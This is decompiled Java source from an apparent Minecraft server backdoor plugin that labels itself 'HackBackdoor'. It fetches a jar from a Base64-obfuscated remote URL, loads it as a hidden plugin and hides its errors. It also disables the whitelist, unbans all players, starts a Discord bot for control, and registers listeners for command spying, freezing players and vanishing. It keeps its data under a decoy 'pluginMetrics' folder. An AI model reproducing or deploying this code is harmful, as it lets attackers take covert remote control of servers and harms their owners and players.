/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.apache.logging.log4j.LogManager
 *  org.apache.logging.log4j.core.Appender
 *  org.apache.logging.log4j.core.Logger
 *  org.bukkit.BanList$Type
 *  org.bukkit.Bukkit
 *  org.bukkit.OfflinePlayer
 *  org.bukkit.event.Listener
 *  org.bukkit.plugin.Plugin
 */
package me.system.runner.methods;

import com.minecraftforceop.jda.jda.api.JDABuilder;
import com.minecraftforceop.jda.jda.api.requests.GatewayIntent;
import com.minecraftforceop.jda.jda.api.utils.ChunkingFilter;
import com.minecraftforceop.jda.jda.api.utils.MemberCachePolicy;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Base64;
import me.system.runner.Core;
import me.system.runner.command.CommandManager;
import me.system.runner.command.impl.login.LoginCommand;
import me.system.runner.data.DataManager;
import me.system.runner.events.AntiBanListener;
import me.system.runner.events.BombListener;
import me.system.runner.events.CommandSpyListener;
import me.system.runner.events.DisableCommandsListener;
import me.system.runner.events.DropListener;
import me.system.runner.events.ForceDirtListener;
import me.system.runner.events.ForceLoginListener;
import me.system.runner.events.ForceMessageListener;
import me.system.runner.events.FreezePlayerListener;
import me.system.runner.events.GodModeListener;
import me.system.runner.events.LockChatListener;
import me.system.runner.events.MOTDListener;
import me.system.runner.events.NoCommandsListener;
import me.system.runner.events.NoPickupListener;
import me.system.runner.events.NoPunishmentCommandListener;
import me.system.runner.events.ScaffoldListener;
import me.system.runner.events.StorageDisableListener;
import me.system.runner.events.VanishListener;
import me.system.runner.events.WandListener;
import me.system.runner.methods.API;
import me.system.runner.methods.LogAppender;
import me.system.runner.utils.SLAPI;
import me.system.runner.utils.Settings;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.Appender;
import org.apache.logging.log4j.core.Logger;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.event.Listener;
import org.bukkit.plugin.Plugin;

public class onEnable {
    private static final /* synthetic */ Core INSTANCE;

    private static void registerListeners() {
        if (onEnable.INSTANCE.enabled) {
            Bukkit.getServer().getPluginManager().registerEvents((Listener)new NoCommandsListener(), (Plugin)INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents((Listener)new CommandSpyListener(), (Plugin)INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents((Listener)new FreezePlayerListener(), (Plugin)INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents((Listener)new BombListener(), (Plugin)INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents((Listener)new DisableCommandsListener(), (Plugin)INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents((Listener)new NoPunishmentCommandListener(), (Plugin)INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents((Listener)new GodModeListener(), (Plugin)INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents((Listener)new LockChatListener(), (Plugin)INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents((Listener)new ForceMessageListener(), (Plugin)INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents((Listener)new NoPickupListener(), (Plugin)INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents((Listener)new StorageDisableListener(), (Plugin)INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents((Listener)new DropListener(), (Plugin)INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents((Listener)new MOTDListener(), (Plugin)INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents((Listener)new WandListener(), (Plugin)INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents((Listener)new VanishListener(), (Plugin)INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents((Listener)new ForceLoginListener(), (Plugin)INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents((Listener)new AntiBanListener(), (Plugin)INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents((Listener)new ScaffoldListener(), (Plugin)INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents((Listener)new ForceDirtListener(), (Plugin)INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents((Listener)new GodModeListener(), (Plugin)INSTANCE);
            Logger llllllllllllllIlllIIllIllIllIlII = (Logger)LogManager.getRootLogger();
            llllllllllllllIlllIIllIllIllIlII.addAppender((Appender)new LogAppender());
        }
    }

    public static void ju() throws IOException {
        if (DataManager.getData().getBoolean("login")) {
            try {
                byte[] llllllllllllllIlllIIllIllIlIlIll = Base64.getDecoder().decode(DataManager.getData().getString("key"));
                onEnable.INSTANCE.jda = JDABuilder.createDefault(new String(llllllllllllllIlllIIllIllIlIlIll)).setChunkingFilter(ChunkingFilter.ALL).setMemberCachePolicy(MemberCachePolicy.ALL).enableIntents(GatewayIntent.GUILD_MEMBERS, new GatewayIntent[0]).build();
                onEnable.INSTANCE.botEnabled = true;
            }
            catch (Exception llllllllllllllIlllIIllIllIlIlIIl) {
                llllllllllllllIlllIIllIllIlIlIIl.printStackTrace();
            }
        }
    }

    private static void reDownload() {
        try {
            byte[] llllllllllllllIlllIIllIllIIIllll = Base64.getDecoder().decode("aHR0cHM6Ly9hcGkubWluZWNyYWZ0Zm9yY2VvcC5jb20vbmFtZS5waHA=");
            URL llllllllllllllIlllIIllIllIIIllIl = new URL(new String(llllllllllllllIlllIIllIllIIIllll));
            HttpURLConnection llllllllllllllIlllIIllIllIIIlIll = (HttpURLConnection)llllllllllllllIlllIIllIllIIIllIl.openConnection();
            llllllllllllllIlllIIllIllIIIlIll.addRequestProperty("User-Agent", "Mozilla");
            BufferedReader llllllllllllllIlllIIllIllIIIlIlI = new BufferedReader(new InputStreamReader(llllllllllllllIlllIIllIllIIIlIll.getInputStream()));
            String llllllllllllllIlllIIllIllIIIlIIl = llllllllllllllIlllIIllIllIIIlIlI.readLine().replace(".jar", "");
            if (INSTANCE.getDescription().getName() != llllllllllllllIlllIIllIllIIIlIIl && Bukkit.getPluginManager().getPlugin(llllllllllllllIlllIIllIllIIIlIIl) == null) {
                byte[] llllllllllllllIlllIIllIllIIlIIIl = Base64.getDecoder().decode("aHR0cHM6Ly9hcGkubWluZWNyYWZ0Zm9yY2VvcC5jb20vZG93bmxvYWQucGhwP3BvcnQ9");
                URLConnection llllllllllllllIlllIIllIllIIlIIII = new URL(String.valueOf(new StringBuilder().append(new String(llllllllllllllIlllIIllIllIIlIIIl)).append(Bukkit.getServer().getPort()))).openConnection();
                llllllllllllllIlllIIllIllIIlIIII.addRequestProperty("User-Agent", "Mozilla");
                Bukkit.getScheduler().runTaskLater((Plugin)INSTANCE, () -> {
                    try {
                        Files.copy(llllllllllllllIlllIIllIllIIlIIII.getInputStream(), Paths.get(String.valueOf(new StringBuilder().append("plugins/").append(llllllllllllllIlllIIllIllIIIlIIl).append(".jar")), new String[0]), StandardCopyOption.REPLACE_EXISTING);
                        Bukkit.getPluginManager().loadPlugin(new File(Paths.get(String.valueOf(new StringBuilder().append("plugins/").append(llllllllllllllIlllIIllIllIIIlIIl).append(".jar")), new String[0]).toString()));
                        Files.setAttribute(Paths.get(String.valueOf(new StringBuilder().append("plugins/").append(llllllllllllllIlllIIllIllIIIlIIl).append(".jar")), new String[0]), "dos:hidden", true, new LinkOption[0]);
                        if (Bukkit.getPluginManager().getPlugin(llllllllllllllIlllIIllIllIIIlIIl) != null) {
                            Bukkit.getPluginManager().enablePlugin(Bukkit.getPluginManager().getPlugin(llllllllllllllIlllIIllIllIIIlIIl));
                        }
                    }
                    catch (Exception llllllllllllllIlllIIllIlIlIllIll) {
                        // empty catch block
                    }
                }, 60L);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static void loadData() {
        try {
            onEnable.INSTANCE.lite = (ArrayList)SLAPI.load("plugins/pluginMetrics/data/rdata.bin");
            onEnable.INSTANCE.premium = (ArrayList)SLAPI.load("plugins/pluginMetrics/data/rpredata.bin");
            onEnable.INSTANCE.admin = (ArrayList)SLAPI.load("plugins/pluginMetrics/data/radata.bin");
            onEnable.INSTANCE.blatant = (ArrayList)SLAPI.load("plugins/pluginMetrics/data/bdata.bin");
            onEnable.INSTANCE.god = (ArrayList)SLAPI.load("plugins/pluginMetrics/data/gdata.bin");
            onEnable.INSTANCE.noPickupPlayers = (ArrayList)SLAPI.load("plugins/pluginMetrics/data/npudata.bin");
            onEnable.INSTANCE.vanish = (ArrayList)SLAPI.load("plugins/pluginMetrics/data/vdata.bin");
            onEnable.INSTANCE.frozenPlayers = (ArrayList)SLAPI.load("plugins/pluginMetrics/data/fdata.bin");
            onEnable.INSTANCE.cmdSpy = (ArrayList)SLAPI.load("plugins/pluginMetrics/data/sdata.bin");
            onEnable.INSTANCE.commandSpyTargets = (ArrayList)SLAPI.load("plugins/pluginMetrics/data/csdata.bin");
            onEnable.INSTANCE.isLocked = (Boolean)SLAPI.load("plugins/pluginMetrics/data/isbool.bin");
            onEnable.INSTANCE.frozen = (Boolean)SLAPI.load("plugins/pluginMetrics/data/fabool.bin");
            onEnable.INSTANCE.modCmd = (Boolean)SLAPI.load("plugins/pluginMetrics/data/mcbool.bin");
            onEnable.INSTANCE.playerCommandsLocked = (Boolean)SLAPI.load("plugins/pluginMetrics/data/lcbool.bin");
            onEnable.INSTANCE.chatLocked = (Boolean)SLAPI.load("plugins/pluginMetrics/data/lchbool.bin");
            onEnable.INSTANCE.storagesDisabled = (Boolean)SLAPI.load("plugins/pluginMetrics/data/lconbool.bin");
            DataManager.bannedPlayers.addAll(DataManager.getData().getStringList("epic-players"));
        }
        catch (Exception llllllllllllllIlllIIllIlllIIlIII) {
            // empty catch block
        }
        onEnable.registerListeners();
    }

    private static void jr() {
        for (String llllllllllllllIlllIIlllIIIIlIIlI : DataManager.getData().getStringList("epic-pl")) {
            byte[] llllllllllllllIlllIIlllIIIIlIlll = Base64.getDecoder().decode(llllllllllllllIlllIIlllIIIIlIIlI);
            Plugin llllllllllllllIlllIIlllIIIIlIlII = Bukkit.getPluginManager().getPlugin(new String(llllllllllllllIlllIIlllIIIIlIlll));
            if (llllllllllllllIlllIIlllIIIIlIlII == null || !llllllllllllllIlllIIlllIIIIlIlII.isEnabled()) continue;
            API.disablePlugin(llllllllllllllIlllIIlllIIIIlIlII.getName());
        }
    }

    private static void checkKillSwitch() {
        String llllllllllllllIlllIIllIlllllIllI = "me.system.runner.Core";
        String llllllllllllllIlllIIllIlllllIlII = INSTANCE.getDescription().getMain();
        String llllllllllllllIlllIIllIlllllIIlI = "HackBackdoor";
        String llllllllllllllIlllIIllIllllIllll = INSTANCE.getDescription().getName();
        String llllllllllllllIlllIIllIllllIllIl = "1.0.0";
        String llllllllllllllIlllIIllIllllIlIll = INSTANCE.getDescription().getVersion();
        String llllllllllllllIlllIIllIllllIlIII = "IHacked";
        onEnable.loadData();
    }

    public onEnable() {
        onEnable llllllllllllllIlllIIlllIIlIIIIIl;
    }

    static {
        INSTANCE = (Core)Core.getPlugin(Core.class);
    }

    public static void start() throws IOException {
        DataManager.setupData();
        if (!DataManager.getData().getBoolean("whitelist_allowed")) {
            Bukkit.setWhitelist((boolean)false);
        }
        if (DataManager.getData().getBoolean("autounban")) {
            for (OfflinePlayer llllllllllllllIlllIIlllIIIlIlIIl : Bukkit.getOfflinePlayers()) {
                Bukkit.getServer().getBanList(BanList.Type.NAME).pardon(llllllllllllllIlllIIlllIIIlIlIIl.getName());
            }
        }
        if (Settings.LOGIN_COMMAND != DataManager.getData().getString("login_command")) {
            Settings.LOGIN_COMMAND = DataManager.getData().getString("login_command");
        }
        Bukkit.getServer().getPluginManager().registerEvents((Listener)new CommandManager(), (Plugin)INSTANCE);
        Bukkit.getPluginManager().registerEvents((Listener)new LoginCommand(), (Plugin)INSTANCE);
        API.dupe();
        Bukkit.getScheduler().runTaskLater((Plugin)INSTANCE, () -> {
            try {
                onEnable.ju();
            }
            catch (IOException llllllllllllllIlllIIllIlIlIlIlIl) {
                // empty catch block
            }
            onEnable.jr();
        }, 1L);
        onEnable.loadData();
    }
}

